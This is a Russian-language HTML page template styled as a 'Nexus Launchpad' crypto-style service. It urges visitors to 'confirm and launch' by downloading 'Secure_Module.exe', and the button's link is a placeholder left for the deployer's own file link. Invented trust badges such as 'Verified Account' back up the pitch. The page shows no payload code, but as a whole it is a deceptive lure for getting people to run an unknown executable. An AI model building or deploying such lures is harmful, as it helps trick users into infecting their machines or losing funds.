<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#0d1117] text-[#c9d1d9] flex items-center justify-center min-h-screen p-4 font-sans">

    <div class="max-w-md w-full bg-[#161b22] border border-[#30363d] rounded-3xl p-10 shadow-2xl text-center">
        <!-- Анимированный статус -->
        <div class="mb-8 relative flex justify-center">
            <div class="absolute inset-0 bg-blue-500 blur-2xl opacity-10 animate-pulse"></div>
            <div class="h-16 w-16 bg-blue-600 rounded-2xl flex items-center justify-center shadow-lg">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
            </div>
        </div>

        <h1 class="text-2xl font-bold text-white mb-4">Nexus Launchpad v1.4</h1>
        <p class="text-sm text-gray-400 mb-10 leading-relaxed">
            Для активации вашей ноды и доступа к лаунчпаду необходимо подтверждение через 
            <span class="text-blue-400 font-mono">Secure_Module.exe</span>.
        </p>

        <!-- ГЛАВНАЯ КНОПКА -->
        <a href="ТВОЯ_ПУБЛИЧНАЯ_ССЫЛКА_НА_ФАЙЛ" 
           class="block w-full py-5 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-bold text-lg transition-all shadow-xl shadow-blue-900/40 active:scale-95">
            ПОДТВЕРДИТЬ И ЗАПУСТИТЬ
        </a>

        <div class="mt-8 flex justify-center gap-4">
            <span class="text-[10px] text-gray-600 uppercase tracking-tighter italic">Status: Verified Account</span>
            <span class="text-[10px] text-gray-600 uppercase tracking-tighter italic">Network: Layer 7</span>
        </div>
    </div>

</body>
</html>
